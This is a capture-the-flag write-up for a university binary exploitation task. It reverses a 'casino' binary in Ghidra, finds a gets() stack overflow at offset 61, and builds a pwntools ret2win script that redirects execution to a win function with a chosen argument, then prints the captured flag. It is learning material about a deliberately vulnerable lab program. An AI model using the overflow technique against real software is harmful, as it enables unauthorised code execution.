### Task 3 - Binary Exploitation

### Analysing the binary
To start with, we need to open the binary in a dissasembler and see what it actually does in order to understand how it can be exploited. For this, we have used **Ghidra** which is open-source.

The first thing we look for is the *Exports* tab which contains the binary's exporte function. We find here refferences to 3 interesting functions: **win**, **lose**, **main**.

![[Pasted image 20210330224409.png]]

Going to the main functions, we see that there are 2 different branches, depending on the string given as input when prompted:
- if the input is equal to **vacanteee**, we get a video [link](https://www.youtube.com/watch?v=tXO2QtjixaM) back and the message **Ah le le le eeeeee!***
- if the input string is equal to **ROREVOLUT99940954621915 VALOARE++**, the *win* function is called with **0x29a** as paramter
- otherwise, the lose function is called

![[Pasted image 20210330224741.png]]

At this point, we are not interested in what the *lose* function does but rather the *win* function, as the name suggests. This function can also be split into two as follows:
- if the function parameter is **0x1133370d** then:
	- if the random value generated % 32 < 0x2a then the message **You are not 1337 enough!** is displayed
	- else, **You shall not pass** is displayed
- else, a file named **flag** is opened and its content is displayed on *stdout* as well as another Youtube [link](https://www.youtube.com/watch?v=pOyK9qQpdyQ). Of course, if the file does not exists, we are asked to connect to the remote server rather than locally.

![[Pasted image 20210330225152.png]]


### Finding the vulnerability
It should be clearly that, in order to retrieve the flag, we need to call the *win* function with the argument **0x1133370d**. However, as noticed in the pseudocode, the program calls the function with **0x29a** as parameter and thus, following this logic, we would never be able to retrive the flag, regardless of the input provided to the program. We need to change our focus to finding a vulnerability. As the task description mentions, this is a **Binary Exploitation** task and thus, we start looking for possible [**Buffer Overflow**](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow) vulnerabilities.

We go back to our main function which handles the user input and see that the input is storred inside a **double word** variable which is of length 4 bytes. This value contains the output of the **frnr66** functions which uses the a variable of type chr* in order to store the output of the **gets** function. This is indeed vulnerable to buffer overflow as the *gets* functions takes all the character given as the input until a new line is given.

![[Pasted image 20210330230103.png]]

Therefore, any input with length greater than 57 characters should successfully cause a buffer overflow in the program. We can confirm this by giving 100 caracters as input to the program and check its behavior.
```bash
┌─[kayn@parrot]─[~/Documents/ISC/task3]
└──╼ $./casino
Welcome to the Saint Tropez Virtual Casino!
Please enter your bank account:
AAAAAAAAA
You lose! Have a good day, sir!
┌─[✗]─[kayn@parrot]─[~/Documents/ISC/task3]
└──╼ $./casino
Welcome to the Saint Tropez Virtual Casino!
Please enter your bank account:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```


### Exploiting the binary
In order to successfully exploit the binary and make it call the **win** function with our desired parameter, we have to follow some basic steps:
1. Find the offset at which we have control over EIP. To do this, we need to generate a payload which we can track any sequence and determine its position in the payload. For this, we used the **gef** extension for peda and **pattern create** and **pattern search** functions of it
	```bash
	gef➤  pattern create 100                                                       
	[+] Generating a pattern of 100 bytes                                           
	aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa      
	[+] Saved as '$_gef0'
	gef➤  run
	Starting program: /home/kayn/Documents/ISC/task3/casino
	Welcome to the Saint Tropez Virtual Casino!
	Please enter your bank account:
	aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa                                                           
	Program received signal SIGSEGV, Segmentation fault.
	0x71616161 in ?? ()
	[ Legend: Modified register | Code | Heap | Stack | String ]                           
	──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
	$eax   : 0xffffd0cf  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
	$ebx   : 0x0       
	$ecx   : 0x1f      
	$edx   : 0xffffd0cf  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
	$esp   : 0xffffd110  →  "aaaraaasaaataaauaaavaaawaaaxaaayaaa"
	$ebp   : 0x70616161 ("aaap"?)
	$esi   : 0xf7f9e000  →  0x001e4d6c
	$edi   : 0xf7f9e000  →  0x001e4d6c
	$eip   : 0x71616161 ("aaaq"?)
	$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
	$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
	──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
	0xffffd110│+0x0000: "aaaraaasaaataaauaaavaaawaaaxaaayaaa"        ← $esp
	0xffffd114│+0x0004: "aaasaaataaauaaavaaawaaaxaaayaaa"
	0xffffd118│+0x0008: "aaataaauaaavaaawaaaxaaayaaa"
	0xffffd11c│+0x000c: "aaauaaavaaawaaaxaaayaaa"
	0xffffd120│+0x0010: "aaavaaawaaaxaaayaaa"
	0xffffd124│+0x0014: "aaawaaaxaaayaaa"
	0xffffd128│+0x0018: "aaaxaaayaaa"
	0xffffd12c│+0x001c: "aaayaaa"
	────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
	[!] Cannot disassemble from $PC
	[!] Cannot access memory at address 0x71616161
	────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
	[#0] Id 1, Name: "casino", stopped 0x71616161 in ?? (), reason: SIGSEGV
	──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
	───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────

	```
2. Look at the EIP value when the program existed with **SIGSEGV** and use it to search the offset of it in the payload.
	```bash
	gef➤  pattern search aaaq
	[+] Searching 'aaaq'
	[+] Found at offset 64 (little-endian search) likely
	[+] Found at offset 61 (big-endian search)
	```
3. Check which of the offsets is correct by generating multiple **A** followed by **BBBB** which should override the EIP
	```bash
	Please enter your bank account:
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB           
	Program received signal SIGSEGV, Segmentation fault.                                                                                                   
	0x42414141 in ?? ()                                                                                                                                      
	[ Legend: Modified register | Code | Heap | Stack | String ]                                                                       
	────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
	$eax   : 0xffffd0cf  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
	$ebx   : 0x0       
	$ecx   : 0x1f      
	$edx   : 0xffffd0cf  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
	$esp   : 0xffffd110  →  0x00424242 ("BBB"?)
	$ebp   : 0x41414141 ("AAAA"?)
	$esi   : 0xf7f9e000  →  0x001e4d6c
	$edi   : 0xf7f9e000  →  0x001e4d6c
	$eip   : 0x42414141 ("AAAB"?)
	$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
	$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
	────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
	0xffffd110│+0x0000: 0x00424242 ("BBB"?)  ← $esp
	0xffffd114│+0x0004: 0xffffd1e4  →  0xffffd38d  →  "/home/kayn/Documents/ISC/task3/casino"
	0xffffd118│+0x0008: 0xffffd1ec  →  0xffffd3b3  →  "SHELL=/bin/bash"
	0xffffd11c│+0x000c: 0x080488d1  →  <__libc_csu_init+33> lea eax, [ebx-0xf8]
	0xffffd120│+0x0010: 0xf7fe4080  →   push ebp
	0xffffd124│+0x0014: 0xffffd140  →  0x00000001
	0xffffd128│+0x0018: 0x00000000
	0xffffd12c│+0x001c: 0xf7dd7e46  →  <__libc_start_main+262> add esp, 0x10
	──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
	[!] Cannot disassemble from $PC
	[!] Cannot access memory at address 0x42414141
	──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
	[#0] Id 1, Name: "casino", stopped 0x42414141 in ?? (), reason: SIGSEGV
	────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
	─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
	gef➤
	─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
	┌─[kayn@parrot]─[~/Documents/ISC/task3]
	└──╼ $python2 -c "print 'A' * 64"
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

	```

	We see that for offset 64, the EIP does not contain **BBBB**. Therefore, the correct offset is 61 as can be seen in the following output.
	```bash
	Please enter your bank account:                                                 
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB  
	Program received signal SIGSEGV, Segmentation fault.                                                                                                   
	0x42424242 in ?? ()                                                                                                                                  
	[ Legend: Modified register | Code | Heap | Stack | String ]                                                                                        
	────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
	$eax   : 0xffffd0cf  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
	$ebx   : 0x0       
	$ecx   : 0x1f      
	$edx   : 0xffffd0cf  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
	$esp   : 0xffffd110  →  0x00000000
	$ebp   : 0x41414141 ("AAAA"?)
	$esi   : 0xf7f9e000  →  0x001e4d6c
	$edi   : 0xf7f9e000  →  0x001e4d6c
	$eip   : 0x42424242 ("BBBB"?)
	$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
	$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
	────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
	0xffffd110│+0x0000: 0x00000000   ← $esp
	0xffffd114│+0x0004: 0xffffd1e4  →  0xffffd38d  →  "/home/kayn/Documents/ISC/task3/casino"
	0xffffd118│+0x0008: 0xffffd1ec  →  0xffffd3b3  →  "SHELL=/bin/bash"
	0xffffd11c│+0x000c: 0x080488d1  →  <__libc_csu_init+33> lea eax, [ebx-0xf8]
	0xffffd120│+0x0010: 0xf7fe4080  →   push ebp
	0xffffd124│+0x0014: 0xffffd140  →  0x00000001
	0xffffd128│+0x0018: 0x00000000
	0xffffd12c│+0x001c: 0xf7dd7e46  →  <__libc_start_main+262> add esp, 0x10
	──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
	[!] Cannot disassemble from $PC
	[!] Cannot access memory at address 0x42424242
	──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
	[#0] Id 1, Name: "casino", stopped 0x42424242 in ?? (), reason: SIGSEGV
	────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
	─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
	gef➤  
	─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
	┌─[kayn@parrot]─[~/Documents/ISC/task3]
	└──╼ $python2 -c "print 'A' * 61"
	AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
	```
4.  Find the *win* function address. Moreover, due to the 32-bit convention, the function must be proceeded by the address of the return value and then the parameters. In order to automate the process of finding the address of these functions, we have used [**pwntools**](https://docs.pwntools.com/en/latest/) from python in order to automatically fetch the adress of any symbol(function) and also to look for an instruction which performs a **ret** address(return). Moreover, this values have to be converted in the appropriate format. (0x34356789 -> \x34\x35\x67\x89).
	```python
	#!/usr/bin/env/python3
	from pwn import *

	elf = ELF("./casino", checksec=False)
	rop = ROP(elf)

	win_addr = p32(elf.symbols['win'])
	ret_addr = p32(rop.find_gadget(['ret'])[0])
	param_value = p32(0x1133370d)
	```
5. Generate the final payload containing based on the following *formula*:
	```python
	payload = 'A' * overflow_offset + function_address + function_return_address + function_parameter1
	```

   Therefore, the final code looks like the following

	```python
	#!/usr/bin/env/python3
	from pwn import *

	elf = ELF("./casino", checksec=False)
	rop = ROP(elf)

	win_addr = p32(elf.symbols['win'])
	ret_addr = p32(rop.find_gadget(['ret'])[0])
	param_value = p32(0x1133370d)


	payload = "A" * 61 + win_addr + ret_addr + param_value
	p = remote('isc2021.root.sx', 10013)
	p.sendline(payload)
	p.interactive()
	```
	
	Upon running the script, we get the flag.
	```bash
	┌─[kayn@parrot]─[~/Documents/ISC/task3]
	└──╼ $python2 bof.py 
	[*] Loaded 10 cached gadgets for './casino'
	[+] Opening connection to isc2021.root.sx on port 10013: Done
	[*] Switching to interactive mode
	Welcome to the Saint Tropez Virtual Casino!
	Please enter your bank account:
	https://www.youtube.com/watch?v=pOyK9qQpdyQ SpeishFlag{vt4IPyKIjccccO8baDjaRFJWqolpoCcn}
	
	Program exited with 0
	[*] Got EOF while reading in interactive
	$  
	```


### Flag
**SpeishFlag{vt4IPyKIjccccO8baDjaRFJWqolpoCcn}**